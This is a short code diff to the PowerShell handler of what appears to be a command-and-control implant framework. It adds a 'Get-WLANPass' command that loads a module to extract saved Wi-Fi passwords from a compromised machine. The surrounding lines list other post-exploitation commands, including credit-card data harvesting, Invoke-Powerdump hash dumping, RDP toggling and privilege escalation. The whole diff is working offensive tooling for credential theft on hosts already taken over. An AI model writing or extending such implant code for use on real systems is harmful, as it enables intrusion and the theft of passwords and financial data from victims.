@@ -142,6 +142,8 @@ function Implant-Handler
         write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
         write-host " EnableRDP" -ForegroundColor Green
         write-host " DisableRDP" -ForegroundColor Green
+        write-host " Get-WLANPass" -ForegroundColor Green
+        write-host " Get-WmiObject -Class Win32_Product" -ForegroundColor Green
         write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
         write-host `n "Privilege Escalation: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
@@ -835,6 +837,10 @@ param
             { 
                 CheckModuleLoaded "Invoke-Powerdump.ps1" $psrandomuri
                 $pscommand = "Invoke-Powerdump"
+            }
+            if ($pscommand.ToLower().StartsWith('get-wlanpass'))
+            { 
+                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
             { 
